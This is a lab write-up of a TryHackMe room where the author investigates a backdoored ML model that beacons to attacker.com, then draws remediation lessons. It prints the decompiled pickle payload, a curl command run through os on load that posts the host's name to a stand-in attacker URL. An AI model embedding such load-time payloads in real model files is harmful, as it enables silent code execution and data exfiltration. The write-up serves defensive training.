# TryHackMe: Payload

**Room:** [Payload](https://tryhackme.com/room/payload) (Premium) · **Path:** AI Security › AI Supply Chain Security · **Time:** ~30 min
**Author:** Marcin Korczak ([@KordjanCode](https://github.com/KordjanCode))

> This is a premium room, so I masked the answers and the flag. The goal here is to show how I worked through it, not to hand out answers.

## The scenario

*TryTrainMe's production code review model is phoning home. Investigate the breach.*

A SOC alert fired at 03:14. Nothing had been deployed and nothing had been changed, but the ML inference server was making outbound HTTPS connections to an unknown address. I got SSH access to an investigation workstation, with everything I needed in `/opt/supply-chain/incident/`.

The room suggests a clear order: logs first to build a timeline, then the production model, and finally the candidate model the engineers want to deploy next. I followed it.

---

## Step 1: Looking around

First I wanted to see what I was working with:

```bash
cd /opt/supply-chain/incident/
ls -la /opt/supply-chain/incident/*
```

```
checksums/  expected_hashes.json
logs/       beacon_capture.log  deployment.log  network.log
models/     baseline_model.h5  candidate_model.h5  original_model.pkl
            original_model.safetensors  production_model.pkl
project/    requirements.txt
```

Four folders: trusted hashes, logs, models and the project. One thing jumped out straight away: `production_model.pkl` is 4.2 MB, while `original_model.pkl` is only 3.7 KB. That's a big difference for something that's supposed to be the "same" model.

## Step 2: Building the timeline from the deployment log

```bash
cat logs/deployment.log
```

```
[2024-01-05 09:15:23] INFO  Source: huggingface.co/verified-ml-team/code-review-bert
[2024-01-05 09:15:25] INFO  Loaded model: original_model.pkl (sha256: 793bb2f5bfdf4a1c...)
[2024-01-05 09:15:26] INFO  Model deployed to production inference server
[2024-01-26 14:32:10] INFO  Model update requested by ml-engineer@trytrainme.com
[2024-01-26 14:32:12] INFO  Source: huggingface.co/****************/code-review-bert-v2
[2024-01-26 14:32:14] WARN  New source organisation detected: ****************
[2024-01-26 14:32:15] INFO  Loaded model: production_model.pkl
[2024-01-26 14:32:16] INFO  Model deployed to production inference server
[2024-02-16 03:14:00] ALERT SOC automated alert: unusual outbound HTTPS traffic detected
[2024-02-16 03:14:01] ALERT Destination: attacker.com:443
```

This told me most of the story. The original model came from `verified-ml-team`. On 26 January someone requested an "update", and it was pulled from a **completely different Hugging Face organisation**. The pipeline noticed and logged a `WARN`, but it deployed the model anyway.

The alert came on 16 February, so the malicious model ran in production for `**` days before anyone noticed. It didn't beacon immediately, which makes it look like a delayed, dormant payload.

**Q1** (organisation): `****************` · **Q2** (days): `**`

## Step 3: Checking the hashes

If the original model's hash is known, the first thing to do is check whether the production model matches it.

```bash
cat checksums/expected_hashes.json
```

```json
{
  "original_model.pkl": "793bb2f5bfdf4a1ceb448647885ade7909480a05dc12479c508e7c7f28d29077",
  "original_model.safetensors": "46329f0c011e4d59d588fef1370c0e81ebba132841b7d8d4e2c476d19a150635"
}
```

```bash
sha256sum models/production_model.pkl models/original_model.pkl models/original_model.safetensors
```

```
c4e5d9e4436033b5af27d2c848025ca1f85f38c04a631703e24ecb761234fcd6  production_model.pkl
793bb2f5bfdf4a1ceb448647885ade7909480a05dc12479c508e7c7f28d29077  original_model.pkl
46329f0c011e4d59d588fef1370c0e81ebba132841b7d8d4e2c476d19a150635  original_model.safetensors
```

Both original files match the expected hashes. `production_model.pkl` doesn't match anything, so there was never a trusted hash for it. Nobody verified it before it went live.

## Step 4: Scanning the production model

Pickle files can run code when they're loaded, so I scanned it before doing anything else.

```bash
cd models
modelscan -p production_model.pkl
```

```
Total Issues: 1
--- CRITICAL ---
Unsafe operator found:
  - Severity: CRITICAL
  - Description: Use of unsafe operator 'system' from module 'os'
```

One critical finding: the file calls something from the `os` module. Time to see exactly what.

## Step 5: Decompiling the pickle

`fickling` turns a pickle back into readable Python:

```bash
fickling production_model.pkl
```

```python
from os import ******
_var0 = ******('curl "http://attacker.com/beacon" -d "host=$(********)"')
result0 = _var0
```

That's the payload. When the model is loaded, it runs a shell command that captures the host's name and sends it to `attacker.com/beacon` with `curl -d`. Sending data with `-d` means curl makes a POST request.

To be sure, I also checked the raw opcodes:

```bash
python3 -m pickletools production_model.pkl
```

```
   11: \x8c SHORT_BINUNICODE 'os'
   16: \x8c SHORT_BINUNICODE '******'
   25: \x93 STACK_GLOBAL
   27: \x8c SHORT_BINUNICODE 'curl "http://attacker.com/beacon" -d "host=$(********)"'
   85: \x85 TUPLE1
   87: R    REDUCE
   89: .    STOP
```

`STACK_GLOBAL` imports the function from `os`, `TUPLE1` wraps the command string as its argument, and `REDUCE` calls it. This all happens inside `pickle.load()`. The model doesn't even have to make a prediction; just opening the file is enough to get code execution.

**Q3** (Python function): `******` · **Q4** (shell command): `********`

## Step 6: Reading the beacon capture

Next I went back to the logs to see what actually left the server.

```bash
cd ../logs
cat beacon_capture.log
```

```
[2024-02-16 03:13:47] SESSION beacon-4821 ESTABLISHED  src=10.0.1.50  dst=attacker.com:443
[2024-02-16 03:13:47] REQUEST **** /beacon HTTP/1.1
[2024-02-16 03:13:47] HOST attacker.com
[2024-02-16 03:13:47] PAYLOAD host=ml-server-prod-01&id=THM{********_**_
[2024-02-16 03:13:48] SESSION beacon-4821 BLOCKED  bytes_captured=51  reason=SOC_RULE_4821
```

This matches the decompiled payload: a POST to `/beacon` carrying the hostname (`ml-server-prod-01`). There's also an `id` parameter with the start of a flag, but the capture stops after 51 bytes because the SOC rule blocked the session. So I only had **half of the campaign ID**.

**Q5** (HTTP method): `****`

I also looked at `network.log` to see how the connections built up:

```bash
cat network.log
```

```
2024-02-16T03:01:02Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,4096,ESTABLISHED
2024-02-16T03:02:00Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,8192,ESTABLISHED
2024-02-16T03:10:10Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,16384,ESTABLISHED
2024-02-16T03:13:47Z,10.0.1.50,185.234.72.19,attacker.com,443,HTTPS,32768,BLOCKED
```

The first connection to `attacker.com` (`185.234.72.19`) happened at 03:01, about 13 minutes before the alert. Each connection sent twice as much data as the last (4 → 8 → 16 → 32 KB). Three got through before the fourth was blocked.

## Step 7: Inspecting the candidate model

The engineers had staged `candidate_model.h5` to replace the production model. Given everything so far, I didn't trust it either. The room provides an inspection script in `/opt/supply-chain/tools/`:

```bash
cd ../models
python3 /opt/supply-chain/tools/inspect_h5_model.py candidate_model.h5
```

```
=== Architecture Inspection: candidate_model.h5 ===
  Total layers: 5
  [OK]      InputLayer           input_layer_2
  [OK]      Flatten              flatten_2
  [OK]      Dense                dense_4
  [OK]      Dense                dense_5
  [WARNING] Lambda               **********_****** (function: **********_******)
            exfil_suffix: *****_*****}

  RESULT: 1 layer(s) require review
    - Lambda: Can contain arbitrary Python code that executes at inference time
```

Four normal layers and one `Lambda` layer. A Keras `Lambda` layer stores serialized Python code that runs **every time the model makes a prediction**, which makes it an even quieter backdoor than the pickle. It's also why the candidate is about 5 KB bigger than `baseline_model.h5`.

And there it was: `exfil_suffix`, the missing second half of the flag.

**Q6** (suspicious layer): `**********_******`

## Step 8: Putting the flag together

The attacker split the campaign ID across two artefacts, so no single capture would reveal all of it:

```
beacon_capture.log  →  THM{********_**_
candidate_model.h5  →                  *****_*****}
                       ──────────────────────────────
flag                →  THM{********_**_*****_*****}
```

**Q7** (flag): `THM{********_**_*****_*****}`

The candidate model comes from the same campaign, so it must not be deployed.

---

## What I'd tell the team

**What went wrong:**
- The pipeline spotted a new, untrusted source organisation and only logged a warning.
- Hashes existed for the original model, but nobody checked the replacement against anything.
- Production loaded `.pkl` files, a format that can run arbitrary code on load.
- No model scanning happened before deployment. `modelscan` caught this in seconds.
- The inference server could connect to any address on the internet.

**What I'd do now:** roll back to `original_model.safetensors` (verified hash), quarantine both malicious models, block `attacker.com` and `185.234.72.19`, and treat `ml-server-prod-01` as compromised.

**What I'd change long-term:**
- Make "new source organisation" a hard block that needs approval, not a warning.
- Pin SHA-256 hashes for every model and verify them at deploy time.
- Add `modelscan`, `fickling` and H5 layer inspection as a CI gate.
- Use `safetensors` instead of pickle, and load Keras models with `safe_mode=True` and no `Lambda` layers.
- Allow-list outbound traffic from inference servers.
- Sign models and verify signatures on load.

## IOCs

| Type | Value |
|---|---|
| Domain | `attacker.com` |
| IP | `185.234.72.19` |
| URL | `http://attacker.com/beacon` |
| SHA-256 | `c4e5d9e4436033b5af27d2c848025ca1f85f38c04a631703e24ecb761234fcd6` (`production_model.pkl`) |
| Backdoor | `Lambda` layer in `candidate_model.h5` |
| Victim | `ml-server-prod-01` / `10.0.1.50` |

## Mapping

| Framework | ID | What it covers here |
|---|---|---|
| MITRE ATLAS | AML.T0010 | ML Supply Chain Compromise |
| MITRE ATT&CK | T1195.002 | Compromised software supply chain |
| MITRE ATT&CK | T1059.004 | Unix shell execution (`os.system`) |
| MITRE ATT&CK | T1082 | System information discovery (hostname) |
| MITRE ATT&CK | T1041 | Exfiltration over the C2 channel |
| OWASP LLM Top 10 | LLM03 | Supply Chain |
| CWE | CWE-502 | Deserialization of untrusted data |
| CWE | CWE-494 | Download of code without integrity check |

## Takeaways

The biggest lesson for me: **a model file is code, not just data.** Both pickle and Keras `Lambda` layers can run whatever the attacker wants. I also liked that the room made me correlate two different sources, the network capture and the model itself, to recover the full flag. That's how real investigations work: no single log tells the whole story.

---

*Write-up by Marcin Korczak, based on a TryHackMe lab, for educational purposes.*
